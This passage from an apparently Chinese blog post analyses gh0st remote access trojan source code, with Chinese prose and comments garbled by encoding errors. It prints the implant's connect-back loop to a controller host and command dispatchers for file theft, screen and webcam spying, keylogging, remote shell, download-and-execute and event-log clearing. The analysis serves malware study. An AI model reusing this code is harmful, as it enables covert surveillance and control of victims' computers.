dwPort))</span><br><span class="line">		&#123;</span><br><span class="line">			bBreakError = CONNECT_ERROR;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// ç™»å½•</span></span><br><span class="line">		DWORD dwExitCode = SOCKET_ERROR;</span><br><span class="line">		<span class="built_in">sendLoginInfo</span>(strServiceName, &amp;socketClient, <span class="built_in">GetTickCount</span>() - dwTickCount);</span><br><span class="line">        <span class="comment">//åˆå§‹åŒ–manager</span></span><br><span class="line">		<span class="function">CKernelManager	<span class="title">manager</span><span class="params">(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort)</span></span>;</span><br><span class="line">		socketClient.<span class="built_in">setManagerCallBack</span>(&amp;manager);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// ç­‰å¾…æ§åˆ¶ç«¯å‘é€æ¿€æ´»å‘½ä»¤ï¼Œè¶…æ—¶ä¸º10ç§’ï¼Œé‡æ–°è¿æ¥,ä»¥é˜²è¿æ¥é”™è¯¯</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; (i &lt; <span class="number">10</span> &amp;&amp; !manager.<span class="built_in">IsActived</span>()); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 10ç§’åè¿˜æ²¡æœ‰æ”¶åˆ°æ§åˆ¶ç«¯å‘æ¥çš„æ¿€æ´»å‘½ä»¤ï¼Œè¯´æ˜å¯¹æ–¹ä¸æ˜¯æ§åˆ¶ç«¯ï¼Œé‡æ–°è¿æ¥</span></span><br><span class="line">		<span class="keyword">if</span> (!manager.<span class="built_in">IsActived</span>())</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		DWORD	dwIOCPEvent;</span><br><span class="line">		dwTickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			hEvent = <span class="built_in">OpenEvent</span>(EVENT_ALL_ACCESS, <span class="literal">false</span>, strKillEvent);</span><br><span class="line">			dwIOCPEvent = <span class="built_in">WaitForSingleObject</span>(socketClient.m_hEvent, <span class="number">100</span>);</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line">		&#125; <span class="keyword">while</span>(hEvent == <span class="literal">NULL</span> &amp;&amp; dwIOCPEvent != WAIT_OBJECT_0);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hEvent != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			socketClient.<span class="built_in">Disconnect</span>();</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="built_in">SetErrorMode</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">ReleaseMutex</span>(hInstallMutex);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hInstallMutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åˆšæ³¨å†Œè¿›æ¥ ç³»ç»Ÿè°ƒç”¨ServiceMain ServiceMainç®€å•å®Œå–„ä¸€ä¸‹åç»­ ç„¶åå¼€çº¿ç¨‹è°ƒç”¨main</p>
<p>mainå°†ç«¯å£å·è§£å¯†å‡ºæ¥ åˆ¤æ–­æ˜¯å¦å”¯ä¸€ ç»™è‡ªå·±æä¸€ä¸ªç«¯å£æƒé™ ç„¶åé‡æ–°æ³¨å†Œä¸€ä¸ªæœåŠ¡ æŠŠinstallåˆ äº†</p>
<p>åé¢æŠŠåŠ å¯†åçš„ç«¯å£å¼„å‡ºæ¥ ç„¶åå…ˆè¿éšä¾¿ä¸€ä¸ªç½‘ç«™ ç„¶åè§£å¯†å‡ºæ¥ç«¯å£å·ç­‰ä¿¡æ¯åé¢ç™»å½• åœ¨ç™»å½•<code>socketClient.Connect</code>ä¸­ ä¼šæœ‰æ–°çº¿ç¨‹äº§ç”Ÿ ä¹Ÿå°±æ˜¯å·¥ä½œçº¿ç¨‹</p>
<p><code>m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);</code></p>
<p>å·¥ä½œçº¿ç¨‹å…ˆæ¥å—socket è¿™é‡Œåœ¨æ²¡æœ‰å‘socketçš„æ—¶å€™ä¼šé˜»å¡ä½ æ¥å—åˆ°ä¹‹åå°±å¼€å§‹è§£æ å…·ä½“é€»è¾‘è¿˜è¦å¾€é‡Œè¿›çœ‹OnRead</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WorkThread	å µå¡ç­‰å¾…æ¥æ”¶socket</span><br><span class="line">|</span><br><span class="line">OnRead			åˆ¤æ–­socketæ˜¯å¦ä¸ºå®¢æˆ·ç«¯å‘æ¥çš„ï¼Œå¹¶è§£åŒ…</span><br><span class="line">|</span><br><span class="line">Manager-&gt;OnReceive	è°ƒç”¨Managerä¸‹çš„OnReceive</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œçš„Managerå–å†³ä¸å‰æ–‡ä¸­ç™»å½•åçš„</p>
<p><code>CKernelManager manager(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);</code></p>
<p><code>socketClient.setManagerCallBack(&amp;manager);</code></p>
<p>è¿™é‡Œå®ç°çš„ä¾¿æ˜¯è®¾ç½®Managerä¸ºKernelManager<br>    æ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„OnReceiveå°±æ˜¯åˆ†å‘Manager</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CKernelManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_ACTIVED:</span><br><span class="line">                <span class="built_in">InterlockedExchange</span>((LONG *)&amp;m_bIsActived, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_LIST_DRIVE: <span class="comment">// æ–‡ä»¶ç®¡ç†</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_FileManager, </span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SCREEN_SPY: <span class="comment">// å±å¹•æŸ¥çœ‹</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_WEBCAM: <span class="comment">// æ‘„åƒå¤´</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_VideoManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_AUDIO: <span class="comment">// æ‘„åƒå¤´</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_AudioManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SHELL: <span class="comment">// è¿œç¨‹sehll</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_ShellManager, </span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_KEYBOARD: </span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SYSTEM: </span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_SystemManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> COMMAND_DOWN_EXEC: <span class="comment">// ä¸‹è½½è€…</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_DownManager,</span><br><span class="line">                    (LPVOID)(lpBuffer + <span class="number">1</span>), <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">Sleep</span>(<span class="number">100</span>); <span class="comment">// ä¼ é€’å‚æ•°ç”¨</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_OPEN_URL_SHOW: <span class="comment">// æ˜¾ç¤ºæ‰“å¼€ç½‘é¡µ</span></span><br><span class="line">                <span class="built_in">OpenURL</span>((LPCTSTR)(lpBuffer + <span class="number">1</span>), SW_SHOWNORMAL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_OPEN_URL_HIDE: <span class="comment">// éšè—æ‰“å¼€ç½‘é¡µ</span></span><br><span class="line">                <span class="built_in">OpenURL</span>((LPCTSTR)(lpBuffer + <span class="number">1</span>), SW_HIDE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_REMOVE: <span class="comment">// å¸è½½,</span></span><br><span class="line">                <span class="built_in">UnInstallService</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_CLEAN_EVENT: <span class="comment">// æ¸…é™¤æ—¥å¿—</span></span><br><span class="line">                <span class="built_in">CleanEvent</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SESSION:</span><br><span class="line">                CSystemManager::<span class="built_in">ShutdownWindows</span>(lpBuffer[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_RENAME_REMARK: <span class="comment">// æ”¹å¤‡æ³¨</span></span><br><span class="line">                <span class="built_in">SetHostID</span>(m_strServiceName, (LPCTSTR)(lpBuffer + <span class="number">1</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_UPDATE_SERVER: <span class="comment">// æ›´æ–°æœåŠ¡ç«¯</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">UpdateServer</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>))</span><br><span class="line">                    <span class="built_in">UnInstallService</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_REPLAY_HEARTBEAT: <span class="comment">// å›å¤å¿ƒè·³åŒ…</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="k85PT">FileManager</h5>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CFileManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_LIST_FILES:<span class="comment">// è·å–æ–‡ä»¶åˆ—è¡¨</span></span><br><span class="line">		<span class="built_in">SendFilesList</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_DELETE_FILE:<span class="comment">// åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">		<span class="built_in">DeleteFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">SendToken</span>(TOKEN_DELETE_FINISH);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_DELETE_DIRECTORY:<span class="comment">// åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">		<span class="comment">////printf(&quot;åˆ é™¤ç›®å½• %s\n&quot;, (char *)(bPacket + 1));</span></span><br><span class="line">		<span class="built_in">DeleteDirectory</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">SendToken</span>(TOKEN_DELETE_FINISH);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_DOWN_FILES: <span class="comment">// ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">		<span class="built_in">UploadToRemote</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_CONTINUE: <span class="comment">// ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">		<span class="built_in">SendFileData</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_CREATE_FOLDER:</span><br><span class="line">		<span class="built_in">CreateFolder</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_RENAME_FILE:</span><br><span class="line">		<span class="built_in">Rename</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_STOP:</span><br><span class="line">		<span class="built_in">StopTransfer</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_SET_TRANSFER_MODE:</span><br><span class="line">		<span class="built_in">SetTransferMode</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_FILE_SIZE:</span><br><span class="line">		<span class="built_in">CreateLocalRecvFile</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_FILE_DATA:</span><br><span class="line">		<span class="built_in">WriteLocalRecvFile</span>(lpBuffer + <span class="number">1</span>, nSize <span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_OPEN_FILE_SHOW:</span><br><span class="line">		<span class="built_in">OpenFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, SW_SHOW);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_OPEN_FILE_HIDE:</span><br><span class="line">		<span class="built_in">OpenFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, SW_HIDE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œçš„æ”¶åˆ°çš„åŒ…åŸºæœ¬éƒ½æ˜¯è·¯å¾„ è¿›è¡Œçš„æ“ä½œå…¶å®ä¹Ÿå°±æ˜¯æ‰¾åˆ°è·¯å¾„å¯¹åº”çš„ç®¡ç† ç„¶åè¿›è¡Œæ“ä½œå°±æˆ</p>
<h5 id="egIuX">ScreenManager</h5>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CScreenManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_NEXT:</span><br><span class="line">                        <span class="comment">// é€šçŸ¥å†…æ ¸è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²æ‰“å¼€ï¼ŒWaitForDialogOpenå¯ä»¥è¿”å›</span></span><br><span class="line">                        <span class="built_in">NotifyDialogIsOpen</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_RESET:</span><br><span class="line">                        <span class="comment">//é‡å¯å±å¹•æ•è·å­ç³»ç»Ÿ</span></span><br><span class="line">                        <span class="built_in">ResetScreen</span>(*(LPBYTE)&amp;lpBuffer[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_ALGORITHM_RESET:</span><br><span class="line">                        <span class="comment">//è®¾ç½®å±å¹•æ•è·çš„ç®—æ³•</span></span><br><span class="line">                        m_bAlgorithm = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        m_pScreenSpy-&gt;<span class="built_in">setAlgorithm</span>(m_bAlgorithm);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CTRL_ALT_DEL:</span><br><span class="line">                        <span class="comment">//Ctrl+Alt+Del</span></span><br><span class="line">                        ::<span class="built_in">SimulateCtrlAltDel</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CONTROL:</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// è¿œç¨‹ä»ç„¶å¯ä»¥æ“ä½œ</span></span><br><span class="line">                            <span class="built_in">BlockInput</span>(<span class="literal">false</span>);</span><br><span class="line">                            <span class="built_in">ProcessCommand</span>(lpBuffer + <span class="number">1</span>, nSize - <span class="number">1</span>);<span class="comment">//æŒªåŠ¨é¼ æ ‡</span></span><br><span class="line">                            <span class="built_in">BlockInput</span>(m_bIsBlockInput);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_BLOCK_INPUT: <span class="comment">//ControlThreadé‡Œé”å®š</span></span><br><span class="line">                        m_bIsBlockInput = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_BLANK:</span><br><span class="line">                        m_bIsBlankScreen = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CAPTURE_LAYER:</span><br><span class="line">                        m_bIsCaptureLayer = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        m_pScreenSpy-&gt;<span class="built_in">setCaptureLayer</span>(m_bIsCaptureLayer);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_GET_CLIPBOARD:</span><br><span class="line">                        <span class="built_in">SendLocalClipboard</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_SET_CLIPBOARD:</span><br><span class="line">                        <span class="built_in">UpdateLocalClipboard</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, nSize - <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="built_in">catch</span>(...)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>l1pmoluy,1392181761@qq.com</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="gh0stæºç åˆ†æ">https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> è®¸å¯åè®®ã€‚</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/04/30/WindowsStudy03-%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/" rel="next" title="WindowsStudy03-è¿›ç¨‹çº¿ç¨‹"><span class="post-nav-text">WindowsStudy03-è¿›ç¨‹çº¿ç¨‹</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 </span><a class="with-love" id="animate" href="https://l1pmoluy.github.io" title="l1pmoluy's blog"><span class="icon iconify" data-icon="ri:cloud-line"></span></a><span class="author"> l1pmoluy</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v7.3.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#f5b8d5" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div></body></html>